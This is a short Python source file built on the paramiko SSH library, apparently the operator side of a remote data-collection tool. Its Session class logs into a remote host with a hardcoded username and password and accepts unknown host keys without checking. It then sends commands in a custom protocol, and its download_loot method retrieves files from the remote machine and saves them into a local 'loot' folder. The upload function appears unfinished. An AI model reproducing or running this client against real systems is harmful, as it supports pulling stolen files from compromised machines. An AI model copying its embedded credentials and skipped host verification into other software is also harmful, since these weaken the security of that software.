import paramiko

class Session():
    def __init__(self, address, port=22):
        self.address = address
        self.port = port
        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.channel = 0


    def update_addr(self, address):
        self.address = address

    def update_port(self, port):
        self.port = port

    def init_connection(self):
        self.ssh.connect(hostname=self.address, port=self.port, username='aris', password='lala', allow_agent=False)

        self.channel = self.ssh._transport.open_session()
        self.channel.invoke_shell()
                
        stdin = self.channel.makefile('wb')
        stdout = self.channel.makefile('r')

        # To read from channel:
        #   recv(self, nbytes)
        # To write to channel:
        #   sendall(self, s)

        # Initiate the connection
        self.channel.sendall("0")
        out = self.channel.recv(5)
        print(out)

    def upload_file(self, file, target):
        self.channel.sendall("22|" + file.filename)

    def download_loot(self, target):
        self.channel.sendall("21|"+target)
        num = int(self.channel.recv(10))
        for i in range(num):
            self.channel.sendall("rd")
            name = self.channel.recv(256)
            self.channel.sendall("ok")
            size = int(self.channel.recv(10))
            self.channel.sendall("ok")
            data = self.channel.recv(size)

            file = open("loot/" + name, "wb")
            file.write(data)

        self.channel.sendall("cm")


